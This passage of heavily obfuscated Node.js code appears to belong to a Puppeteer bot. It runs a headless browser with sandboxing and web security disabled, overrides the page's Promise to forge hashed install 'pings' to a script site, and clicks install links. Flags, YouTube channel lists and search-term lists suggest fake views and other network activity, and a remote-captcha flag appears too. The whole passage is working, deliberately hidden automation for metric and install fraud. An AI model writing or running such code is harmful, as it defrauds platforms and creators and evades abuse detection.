0x4 + 0xcc3 + -0x6a6 * 0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x665 * 0x2 + 0x1bfa + 0x5 * -0x824; J < -0xfba + -0x59 * 0x5f + 0x105b * 0x3; ++J)
                K = Q[J - (-0x1 * 0x191a + 0x1 * 0x1fee + -0x15d * 0x5)] ^ Q[J - (0xbf7 * -0x3 + 0x6 * 0x359 + 0xfd7 * 0x1)] ^ Q[J - (0x25fa * -0x1 + 0x1d39 + -0x37 * -0x29)] ^ Q[J - (0x1cd * -0x7 + -0x372 + 0x101d)], Q[J] = K << -0x19 * 0x14a + 0x3 * -0x77 + 0x21a0 | K >>> 0x8b3 * 0x2 + -0x2301 + 0x11ba;
              for (J = -0x1114 * -0x1 + 0x1025 + -0x2139; J < 0xc7 * -0x2 + -0x16a3 + 0x1845; J += 0x17c8 + -0x5c4 + 0x11 * -0x10f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e63 + -0x21d5 + 0x403d | L >>> 0x1af2 + -0x16d3 + 0x404 * -0x1) + (M & N | ~M & O) + P + (-0x8ae2e609 + -0x45117e82 + 0x4a9db789 * 0x4) + Q[J] << 0x9ed + -0x581 + -0x46c) << 0xf55 + -0x15 * 0x1c8 + 0x1618 | P >>> 0x1963 + -0x4 * 0x3f1 + -0xae * 0xe) + (L & (M = M << 0x2 * -0x783 + -0x2c5 * -0x9 + -0x9c9 | M >>> 0x433 * -0x1 + 0x203a + -0x1c05) | ~L & N) + O + (0x1 * 0x488a1053 + 0x63c6c269 + -0x51ce5923) + Q[J + (-0x3 * 0xcc7 + -0x2 * 0x731 + 0x34b8)] << -0x111b + -0x1f2e * -0x1 + 0xe13 * -0x1) << 0x85d + 0x148b + 0x91 * -0x33 | O >>> -0x6d4 + 0xf0b * 0x1 + 0x3 * -0x2b4) + (P & (L = L << -0x1ed3 * -0x1 + -0x45a * 0x1 + 0x27 * -0xad | L >>> 0x766 * -0x3 + -0x1d72 * 0x1 + -0x19d3 * -0x2) | ~P & M) + N + (-0xb41 * -0x22de + -0x88b9e84 + -0x597b99 * -0x117) + Q[J + (0x24 * 0x29 + 0x4c4 + -0xa86)] << -0x1df3 + -0x154c + -0x1115 * -0x3) << 0xe * -0x1c5 + 0x418 * 0x4 + 0x86b | N >>> 0x1d99 + -0x23c4 + 0x646) + (O & (P = P << -0x1b80 + 0x2 * 0x39e + 0x1462 | P >>> -0xb95 + 0x169a + -0xb03) | ~O & L) + M + (0x17fdd7ef + -0xa20725 * 0xb9 + -0xb79bcb67 * -0x1) + Q[J + (0x2fd * 0x4 + -0xb * 0x77 + -0x6d4)] << -0x2255 * 0x1 + -0x7b9 * 0x2 + 0x1 * 0x31c7) << 0x912 + -0x18f6 + -0x1 * -0xfe9 | M >>> 0x89 * 0x3d + -0x7 * 0x317 + -0xae9) + (N & (O = O << -0x27 * 0x5b + -0x13a5 + -0x21a0 * -0x1 | O >>> 0x324 + 0x1da * -0x6 + 0x7fa) | ~N & P) + L + (-0x6b4bcc3b + -0x7d14d * -0x829 + -0x8603587f * -0x1) + Q[J + (-0x66c + 0x205 + 0x46b)] << 0x1255 + 0x1 * -0xa61 + -0x7f4, N = N << -0xf2 * -0x1d + 0x683 * -0x1 + -0x139 * 0x11 | N >>> -0xf7b + -0x18fd + 0x1 * 0x287a;
              for (; J < 0x5 * 0x79 + -0x17c5 + 0x73 * 0x30; J += 0x183 * -0xc + -0x1 * 0x2338 + 0x3 * 0x11cb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * 0x3bf + 0x212c + 0x15ea * -0x1 | L >>> 0x318 * 0x4 + 0xdf * -0x2b + -0xf8 * -0x1a) + (M ^ N ^ O) + P + (-0x75caf15d + -0x26045f5e + 0x10aa93c5c) + Q[J] << -0x1 * -0x2569 + 0x1229 * 0x2 + -0x1 * 0x49bb) << -0x527 * -0x1 + -0x196c + 0x144a | P >>> 0x1ecb * 0x1 + 0x4 * 0x133 + -0x8df * 0x4) + (L ^ (M = M << 0xd7 * 0x26 + 0x1a3e + -0x3a0a | M >>> 0x2271 + 0xd2b + -0x2f9a) ^ N) + O + (0x7ebef42a + 0x1 * 0xd9b47e2d + -0x35e * 0x456015) + Q[J + (0x1355 + -0xa39 * 0x1 + 0x3 * -0x309)] << -0x1 * -0x897 + 0x33 * -0x66 + 0x15 * 0x8f) << -0x269 * -0x1 + -0x28 * 0x4d + 0x9a4 | O >>> -0xed6 + -0x13b3 * 0x1 + 0x22a4 * 0x1) + (P ^ (L = L << -0x1 * 0x1e55 + -0x1551 + 0x33c4 | L >>> 0x1588 + -0x1 * -0x11f + -0x16a5) ^ M) + N + (-0x43bcccaf + -0x32e64 * 0xc11 + 0x1f7 * 0x6e6dac) + Q[J + (-0x1f50 + -0x23ad * -0x1 + -0x45b * 0x1)] << -0x2417 * 0x1 + -0x126b + 0x3682 * 0x1) << 0x12ea + 0x2403 + -0x36e8 | N >>> 0x52f * -0x1 + -0xeb * -0x11 + -0xa51) + (O ^ (P = P << 0x34d + 0x363 + -0x692 | P >>> 0x2688 + 0xc5b + 0x32e1 * -0x1) ^ L) + M + (-0xa06ee4ee + 0x14d9475e + 0xfa6f8931) + Q[J + (-0x131b + -0x931 * -0x3 + -0x1 * 0x875)] << 0x230e + 0x11c1 + -0x34cf) << 0xe78 + 0x1c * 0x15 + -0x595 * 0x3 | M >>> 0x11ab + -0xd * 0x2d9 + -0x1375 * -0x1) + (N ^ (O = O << -0xfd0 + 0xb6 * 0x1a + -0x28e | O >>> -0x277 + 0x1 * 0x85c + -0x5e3) ^ P) + L + (-0x20e0a339 + 0x29a6b6b1 * -0x1 + -0xb961458b * -0x1) + Q[J + (0x1dd3 + -0x9e * 0x12 + 0x1 * -0x12b3)] << -0x1ad7 * -0x1 + -0x1 * -0x11e7 + -0x8a * 0x53, N = N << -0x24e8 + -0xb7 + 0x25bd | N >>> -0x1b1 * 0x17 + -0x26d7 * -0x1 + 0x2 * 0x9;
              for (; J < 0x1de * -0x6 + 0x9 * 0xd1 + -0x3 * -0x15d; J += -0x1dde + 0xbe7 + 0x1 * 0x11fc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x26ad * -0x1 + 0x35 * 0x5c + -0x1 * -0x13a6 | L >>> 0x2379 + -0xf * -0x18b + -0x1381 * 0x3) + (M & N | M & O | N & O) + P - (0x70ff56e2 + -0x12ed3c2e * 0x2 + 0x25bf649e) + Q[J] << -0x3 * 0x28f + 0x2e * -0x8 + -0x91d * -0x1) << -0x81 * 0x18 + 0x83 * 0x27 + 0x4 * -0x1f6 | P >>> -0x2 * 0x8be + 0x1 * -0x7d + -0x4 * -0x485) + (L & (M = M << -0x2 * 0x5f9 + 0xfd * -0x23 + -0x3 * -0xf8d | M >>> -0x2678 + 0xc6b * -0x1 + -0x81 * -0x65) | L & N | M & N) + O - (0x59 * 0x2e1713 + -0x3 * -0x2f1969ca + 0xecf5547 * -0x3) + Q[J + (0x26d7 + -0x184b + 0x4d9 * -0x3)] << -0x1 * 0x1d53 + -0x1193 + 0x29b * 0x12) << 0x1553 + -0x6 * -0x2b8 + -0xa * 0x3c3 | O >>> 0x4 * 0x5f4 + 0x2da * 0x5 + 0x1 * -0x25f7) + (P & (L = L << 0x154e + 0x4b1 + -0x19e1 | L >>> -0x1 * 0x16e5 + 0x2e7 + 0x1400) | P & M | L & M) + N - (0x1cd7599d + -0x95243aec + 0xe9312473) + Q[J + (-0x11 * -0x83 + -0x5 * -0x542 + -0x2d * 0xc7)] << -0x177a + 0xefd + 0x87d) << -0x8 + -0x946 + 0x953 | N >>> -0xb * -0x1ec + -0xf09 + -0x300 * 0x2) + (O & (P = P << -0x440 + 0x2409 + -0x1 * 0x1fab | P >>> 0x1 * -0x1df9 + 0x8a9 * -0x3 + 0x37f6) | O & L | P & L) + M - (0x6d007799 + 0x61a81978 + -0x5dc44ded) + Q[J + (0x22ac * -0x1 + -0x11e8 + 0x3497)] << 0x542 * -0x1 + 0x1662 + 0x8 * -0x224) << 0x1 * 0x1a14 + -0x12b9 + -0x756 | M >>> 0x14b5 + -0x15 * -0x177 + -0x3 * 0x111f) + (N & (O = O << -0x1ef2 + -0xba6 + 0x2ab6 | O >>> 0x1f7b + -0x228a + 0x311) | N & P | O & P) + L - (-0x3f470a21 + -0x1317211a + 0xc3426e5f) + Q[J + (0x1 * 0xccd + -0x126d + 0x5a4)] << -0x2b4 * -0x3 + -0x13f0 + 0xbd4, N = N << 0x1923 + 0x3 * 0xa11 + 0x1f * -0x1c8 | N >>> -0xc93 + 0x1c13 * -0x1 + 0x28a8 * 0x1;
              for (; J < -0x95 * -0x33 + 0x83f * -0x2 + 0x44b * -0x3; J += 0x1146 + 0x14c7 + 0x2608 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x316 + -0x1229 * -0x1 + 0xf0e * -0x1 | L >>> -0x7f5 + -0x11ca + 0x19da) + (M ^ N ^ O) + P - (-0x530ddfdf * 0x1 + 0x1 * -0x619ac1eb + 0x5 * 0x2edac664) + Q[J] << -0xb * 0x187 + 0x1042 + 0x8b) << -0x6b * -0x1 + 0xb * -0xe + 0x34 * 0x1 | P >>> -0x1c6 * 0x13 + 0x13bc + 0xd * 0x115) + (L ^ (M = M << -0x19d5 + 0x59 * 0x21 + 0xe7a | M >>> -0x1 * 0x27 + -0x105 * 0x1d + 0x5f2 * 0x5) ^ N) + O - (-0x303b3 * -0x21f7 + -0x6a458193 + -0x4 * -0xe6006c2) + Q[J + (-0x1a3 * -0x9 + -0x5 * 0x685 + 0x11df * 0x1)] << -0x24ae + 0x1614 + 0xe9a) << 0xc3d + -0x59 * 0xa + -0x8be | O >>> -0x19cc + 0x1e79 + -0x492) + (P ^ (L = L << 0x18a7 + -0x15da * -0x1 + -0x1db * 0x19 | L >>> 0x2b * -0x62 + 0x1df2 + 0x45 * -0x32) ^ M) + N - (0x1d465cd4 + 0xa3 * -0x691687 + -0x828109 * -0xb3) + Q[J + (-0x4ca * 0x1 + 0x11a * -0x8 + 0xd9c)] << 0x232c + 0x901 + -0x2c2d) << 0x4 * 0x210 + 0x11ef + -0xc5 * 0x22 | N >>> 0xee8 * 0x1 + 0xaf9 + -0x19c6) + (O ^ (P = P << -0x2 * -0x39c + 0x1f33 + -0x264d | P >>> 0x1999 * 0x1 + 0xe3 + 0xd3d * -0x2) ^ L) + M - (-0x7bc713f + -0x58c6f330 + -0x9620a299 * -0x1) + Q[J + (0x12c9 * 0x1 + -0x1d59 * 0x1 + 0xa93)] << -0x242a + -0xc1 * 0x2e + -0x2 * -0x236c) << 0x7e1 * -0x2 + -0x1b41 + 0x2b08 | M >>> 0xa * 0xc + 0x1 * 0x1d1f + -0xebe * 0x2) + (N ^ (O = O << 0xa2f + 0x1 * 0x1137 + -0x1b48 | O >>> -0x3 * 0x3b3 + 0x1120 + -0x605) ^ P) + L - (0xf248b5b * -0x5 + -0x39f5ca61 + -0x1f1a2 * -0x6059) + Q[J + (-0xb30 + -0x4bd * 0x1 + 0xff1)] << -0xc9b * 0x2 + 0x502 + 0x1434, N = N << -0x158c + -0xa7 * 0x22 + -0x17 * -0x1e8 | N >>> 0x13ca + -0x17 * 0x1a7 + -0x5 * -0x3a5;
              this['h0'] = this['h0'] + L << 0x7e * -0xe + -0x2615 + 0x2cf9 * 0x1, this['h1'] = this['h1'] + M << -0x82 * -0xd + 0x1e01 + -0x249b, this['h2'] = this['h2'] + N << -0x134a * -0x2 + 0x1032 + -0x36c6, this['h3'] = this['h3'] + O << -0x9ff * -0x1 + -0xd99 + 0x39a, this['h4'] = this['h4'] + P << 0x215c + 0x2ae * 0x7 + -0x341e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xb * 0x191 + -0xa9 + 0x1076 * -0x1 & 0x7 * -0x236 + 0x750 + -0x839 * -0x1] + w[J >> -0x867 * 0x3 + -0xa8a + 0x19 * 0x16f & -0x1b0d + -0x8 * 0x3c0 + 0x391c] + w[J >> 0x1 * -0x24b5 + 0x1 * 0x62e + -0x5 * -0x61f & -0x243a * -0x1 + -0x749 * -0x4 + -0x414f] + w[J >> -0x1 * 0x16f7 + 0x1 * 0x2554 + -0xe4d & 0x1f7 + 0x5 * -0x204 + 0x1 * 0x82c] + w[J >> -0x2192 * -0x1 + 0x214d + -0x42d3 & 0x2b * -0x6d + 0xcf1 + 0x56d] + w[J >> -0x105d * 0x1 + -0x177b + -0x3a0 * -0xb & -0x1 * -0x78b + -0x1f4 * 0x4 + 0xe * 0x6] + w[J >> 0x7 * -0x409 + -0x145 + -0x118 * -0x1b & -0x102f * -0x1 + -0xcaf + -0x371 * 0x1] + w[-0x5f * -0x64 + -0x13a * 0xd + -0x151b & J] + w[K >> 0x22b1 + 0x8 * 0x269 + -0x35dd & 0x7e0 + 0xc7 * 0x15 + -0x6 * 0x406] + w[K >> 0x1 * -0x1981 + 0x1 * 0x1cf3 + 0x3 * -0x11e & 0xa * -0x1d5 + 0x52c * 0x2 + 0x809] + w[K >> 0x6f + 0x9e5 + -0xa40 & 0x200e * 0x1 + -0x1 * -0x1ce1 + -0x20 * 0x1e7] + w[K >> 0xa22 + -0x61 * -0x3d + -0x212f & -0x29 * 0xb3 + 0x2678 + -0x9be] + w[K >> -0x20de + -0x4ea + -0x4 * -0x975 & 0x2ea + 0xa * 0x37a + -0x259f] + w[K >> 0x1b15 + -0x182a + -0x2e3 * 0x1 & 0x7d4 + -0x1516 * -0x1 + -0x1cdb] + w[K >> 0xdbe + 0x213d + -0x2ef7 * 0x1 & 0x1a * 0x12 + -0x1f * -0x131 + 0x135a * -0x2] + w[0xa * -0x21a + 0xc3 * 0x10 + -0x1c7 * -0x5 & K] + w[L >> -0x86 * 0x7 + -0x343 * -0x8 + -0x1 * 0x1652 & -0x1 * 0x1307 + 0x15b * -0x13 + 0x2cd7] + w[L >> -0x1e23 * 0x1 + -0x1 * -0x1d48 + 0xf3 & 0xc5b + -0x1 * 0x1816 + 0xbca] + w[L >> 0xb0e * 0x3 + 0x1 * 0x218d + -0x42a3 & -0xea + -0x441 + -0x3 * -0x1be] + w[L >> -0x1a0 * -0x9 + -0x1 * 0x34a + -0xb46 & 0x1807 + -0x2 * 0x243 + -0x1 * 0x1372] + w[L >> -0x6 * 0x4ff + -0x16ed * -0x1 + 0x719 & 0xd5e + -0x3 * 0x595 + 0x37 * 0x10] + w[L >> -0x28d + 0x215 * -0x11 + 0x25fa & -0x469 * 0x3 + 0x20cf + 0x1 * -0x1385] + w[L >> 0x204d + 0x938 * 0x2 + -0x32b9 & 0x5a1 + -0x86f + -0x1 * -0x2dd] + w[0x1632 + 0x4 * 0x94e + 0x13c9 * -0x3 & L] + w[M >> -0x474 + -0x1 * 0x1139 + -0x1 * -0x15c9 & 0xffe + -0x64e * 0x2 + -0x17 * 0x25] + w[M >> 0x2342 + 0x105d + -0x3387 & 0xa08 + 0xbc7 + -0x15c0] + w[M >> 0xb8f * -0x1 + 0x14b2 + -0x90f & -0x4ed + 0x425 * -0x2 + 0x2 * 0x6a3] + w[M >> -0xb10 + -0x2cb + 0xdeb & -0x19d2 + -0x131 * -0xa + 0xdf7] + w[M >> 0xb7b * -0x2 + -0xa67 * -0x3 + -0x833 & 0x12 * -0x193 + -0x163e + 0x32a3] + w[M >> -0x8bb + -0x14b * 0x1b + 0x45e * 0xa & -0x377 + 0x120b + -0x7 * 0x213] + w[M >> 0x16fa + -0x3c * -0x78 + -0x3316 & 0x180b + -0x1 * 0x509 + -0x12f3] + w[0x1 * 0x2137 + 0x15f1 * 0x1 + -0x3719 & M] + w[N >> 0x64f + 0x2de * 0x5 + 0x1 * -0x1489 & 0xb84 + 0x1d25 + -0x289a] + w[N >> -0x5 * -0x41b + -0x9 * 0x8d + -0xf7a & -0x3da * -0x2 + -0x2 * 0x1d3 + -0x3ff] + w[N >> -0x61 * -0x17 + -0x1 * 0x1c4b + 0x13a8 & -0xb * -0x93 + -0x2 * -0x883 + -0x1748] + w[N >> -0x3 * 0x3a5 + 0xab5 * -0x1 + 0x15b4 & 0x62b * -0x3 + -0x20ff + 0x43 * 0xc5] + w[N >> -0x9 * -0x257 + 0xb72 * 0x1 + -0x2075 & -0x8cf + 0x1 * -0xb2a + 0x502 * 0x4] + w[N >> 0x4f9 + 0x4 * -0x197 + 0x79 * 0x3 & 0x814 + -0x1c2d + 0x408 * 0x5] + w[N >> 0xe5e + -0xfd * 0x1a + 0xb58 & -0xc53 + -0x1 * -0x1cf7 + -0x1095] + w[-0x9 * -0x35 + -0x13 * 0x1c9 + -0x201d * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xea * 0x1e + 0x1fb * -0xb + -0x1 * 0x58b & -0x15a4 + -0x4b7 + 0x1b5a,
                J >> -0x85 * -0x10 + -0x1296 + -0x9 * -0x126 & 0x1f * 0x34 + 0x1d * 0x6a + -0x114f * 0x1,
                J >> -0x792 + 0xe31 + -0x697 & 0x2 * 0xb21 + 0x255d + -0x3aa0,
                -0x789 * 0x5 + 0x1ca * 0x7 + 0x1a26 & J,
                K >> 0x1080 + 0x5cf * -0x1 + -0xa99 & -0x1 * 0x134 + 0x15 * 0x16e + -0x11 * 0x1a3,
                K >> -0xa88 + 0x3 * 0xbd + 0x861 & -0x216 + 0x22bc + -0x1fa7,
                K >> 0x243d * -0x1 + 0x205 * 0x7 + 0x1622 & 0xe3f + 0x443 * 0x1 + -0x1183,
                0x771 + -0x470 * 0x4 + 0xb4e & K,
                L >> 0x20e9 + 0x20e6 * -0x1 + -0x15 * -0x1 & -0x1843 + -0x1 * -0x1fe1 + -0x69f,
                L >> -0x1 * -0x6fd + 0x21eb + 0xa36 * -0x4 & -0xe43 + -0x2 * -0x11ac + -0x1416,
                L >> 0xdc2 + 0xd97 + -0x1b51 & 0x2 * -0xc15 + -0x2535 + 0x6ee * 0x9,
                -0x22f + 0x15a5 * 0x1 + 0x1277 * -0x1 & L,
                M >> -0x833 * 0x1 + -0x15e0 + 0x1 * 0x1e2b & 0x11bb * 0x1 + -0x11b * 0x15 + 0x67b,
                M >> -0x3 * -0x386 + -0x1 * 0x1b9b + 0x1119 & -0x6eb + 0x1 * -0x56 + 0x840,
                M >> 0xd2c + 0x1cc5 + -0x29e9 * 0x1 & 0x9 * 0xe0 + 0x4f * 0x49 + -0x75a * 0x4,
                -0x799 * -0x1 + 0x1b9b * -0x1 + 0x1501 & M,
                N >> 0x27 * 0x3e + 0x14c4 + -0x1e1e & 0x1f3 * 0x14 + -0x1 * 0x1a5b + -0xba2,
                N >> -0x91 * 0x31 + -0x2501 + 0x40d2 & -0x3e * 0x59 + -0x1 * 0x2519 + 0x5 * 0xbee,
                N >> 0x1 * -0xcae + -0x2563 * -0x1 + -0x18ad * 0x1 & -0x236b * -0x1 + -0x6a * -0x1f + 0x107 * -0x2e,
                -0x2e7 * -0x1 + -0x2 * 0x950 + -0x8 * -0x217 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1205 + -0x23ac + 0x11bb), (K = new DataView(J))['setUint32'](0x9a6 + 0x20 * 0xad + 0x1 * -0x1f46, this['h0']), K['setUint32'](0x1b39 + -0xd * 0x266 + 0x71 * 0x9, this['h1']), K['setUint32'](0xf5a + 0xe77 + -0x1dc9, this['h2']), K['setUint32'](-0x1ab9 * -0x1 + -0x940 + -0x116d, this['h3']), K['setUint32'](0x91c + 0x25b2 + -0xc1 * 0x3e, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1e7 + 0x19 * -0xb3 + 0xf94];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x104e + -0x981 + -0x1 * 0x6cd;
            J[0x1 * 0x359 + -0x201e + 0x1cc5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x14eb + -0x1 * -0x207a + -0x3565] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x458 * 0x1 + 0x3 * -0x9ac + 0x215d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2131 + 0x1 * 0x71e + -0x284e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2096 + 0x105 * -0x1e + 0x4508), Promise['resolve'](0x5a7 + 0x2507 + -0x1 * 0x2aad);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x11ea + -0x1c09 + -0xa1f * -0x1; j < -0xaa + -0xb * 0x194 + -0x41 * -0x47; j++)
    i();
}

function a() {
  const br = [
    '.com',
    ',minecraft',
    'syn_52523/',
    'EsbTAw5Ly3jHzG',
    'v3buWP7dKmk3WPhdJ07cSa',
    '\x20NT\x2010.0;\x20',
    'GET',
    'setDefault',
    'y0tdVSkOWRFdU1u4W7FcRa',
    'jtLAB1CmFCkxusi',
    'CMCVzw4VC2nYAq',
    'b8kwAhVcLCkMW7VdK8ktda',
    'Kit/537.36',
    'W6XlW6XWvvhcUv1d',
    'rg/en/scri',
    'getElement',
    'aCk4WQxdR8kuk8kPWRq',
    'WOddSNH7rSoSW57dTCk5WO0',
    'C2XPy2u',
    'werVn1e3EvvfDa',
    'r-tab.styl',
    'W7pcO8k8is7dKSo7W7VdSmo5',
    'yZG5ogu',
    'https://op',
    'm2WYntnYrvnRDW',
    'wstcIKJdJCkfEmovW5tcNW',
    '=0.9',
    'lxnLCMLLCY1VBW',
    'AgvHzgvYCW',
    'WP5qWQ7cH8o+W7q9WRRcJXq',
    'D2X3W6ZdISknW5VdMKJdLG',
    'ywDLls1MAwXSlq',
    'hCkcWQjqFghcMmo3W7pcUG',
    'back-shape',
    'amkXhItdSqNdRCk0WQ7cGq',
    'View',
    'BhLTzxiTzgLZyq',
    'mJbL',
    'avif,image',
    'hte4W53cS8kcqCo1W7tcHa',
    'pg/cSSoIe8kpW7uRwMC',
    'Firefox',
    'W5CBW59TWRjebSo6lCkv',
    'dSo1WPFdUe15s0dcKhK'
  ];
  a = function() {
    return br;
  };
  return a();
}
const NETWORK_PATIENCE = 0x2815 * -0x1 + -0x663 + 0x4db8 + (-0x1 * 0x1c1c + 0xf39 + -0x189b * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2103 + 0xe8a * -0x1 + 0x2f90) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x581 * -0x2 + 0x8 * -0x95 + -0x5 * -0x322; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + a1(0x22, 'G7ix') + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + a1(0xb, 'UwaP') + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + a2(0x1) + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + a3(0x3) + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 